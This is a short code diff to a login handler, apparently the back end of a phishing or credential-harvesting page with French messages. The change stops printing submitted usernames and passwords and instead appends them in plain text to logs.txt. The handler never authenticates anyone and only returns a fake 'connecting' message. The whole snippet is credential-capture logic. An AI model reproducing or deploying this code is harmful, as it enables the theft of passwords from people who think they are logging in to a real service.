@@ -11,8 +11,8 @@ def login():
     username = request.form.get('username')
     password = request.form.get('password')
 
-    print(f"[+] Nom d'utilisateur reçu : {username}")
-    print(f"[+] Mot de passe reçu : {password}")
+    with open("logs.txt", "a") as f:
+        f.write(f"username: {username}, password: {password}\n")
 
     return "<h1>Connexion en cours...</h1>"
 
